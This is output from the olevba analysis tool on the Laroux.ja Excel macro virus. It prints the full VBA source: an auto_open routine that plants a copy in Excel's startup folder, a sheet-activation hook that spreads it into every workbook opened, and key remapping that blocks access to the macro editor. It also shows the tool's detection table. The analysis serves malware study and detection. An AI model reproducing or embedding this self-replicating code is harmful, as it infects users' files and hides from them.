olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.ja-3fc5f48e05a89abdbf201fd0670e638ae202fd41
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.ja-3fc5f48e05a89abdbf201fd0670e638ae202fd41 - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "1006（潘）.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "1006（潘）.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("1006（潘）.xls").Save
    Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "1006（潘）.xls!acop"
  Application.OnKey "%{F11}", "1006（潘）.xls!escape"
  Application.OnKey "%{F8}", "1006（潘）.xls!escape"
End Sub

Sub acop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("1006（潘）.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.ja-3fc5f48e05a89abdbf201fd0670e638ae202fd41 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

